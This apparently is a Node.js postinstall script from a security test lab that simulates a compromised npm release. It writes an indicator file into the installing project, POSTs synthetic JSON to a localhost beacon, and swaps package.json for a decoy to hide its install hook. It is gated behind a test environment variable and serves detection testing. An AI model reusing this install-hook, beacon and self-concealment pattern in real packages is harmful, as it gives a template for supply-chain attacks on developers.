/**
 * Simulates: unexpected dependency + postinstall + benign localhost beacon + manifest swap.
 * Real incidents may steal credentials; this lab only writes markers and POSTs synthetic JSON.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const http = require('http');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  process.exit(0);
}

/** Skip beacon + disk IOC (useful for air-gapped CI that still installs deps). */
if (process.env.TESTBENCH_OFFLINE === '1') {
  process.exit(0);
}

const pkgRoot = __dirname;
/** npm sets INIT_CWD to the directory where `npm install` was invoked (victim app root). */
const projectRoot = process.env.INIT_CWD || process.cwd();

const markerPath = path.join(projectRoot, '.testbench-axios-ioc.json');
const marker = {
  scenario: '21-axios-compromised-release',
  package: 'plain-crypto-js-like',
  phase: 'postinstall',
  cwd: projectRoot,
  time: new Date().toISOString(),
};
fs.writeFileSync(markerPath, JSON.stringify(marker, null, 2), 'utf8');

const payload = JSON.stringify({
  type: 'postinstall-beacon',
  package: 'plain-crypto-js-like',
  cwd: projectRoot,
});

const req = http.request(
  {
    hostname: 'localhost',
    port: 3021,
    path: '/beacon',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  () => {}
);
req.on('error', () => {});
req.write(payload);
req.end();

// Simulated anti-forensics: swap package.json to decoy without postinstall script
try {
  const decoy = fs.readFileSync(path.join(pkgRoot, 'package.clean.json'), 'utf8');
  fs.writeFileSync(path.join(pkgRoot, 'package.json'), decoy, 'utf8');
} catch (_) {
  /* ignore */
}
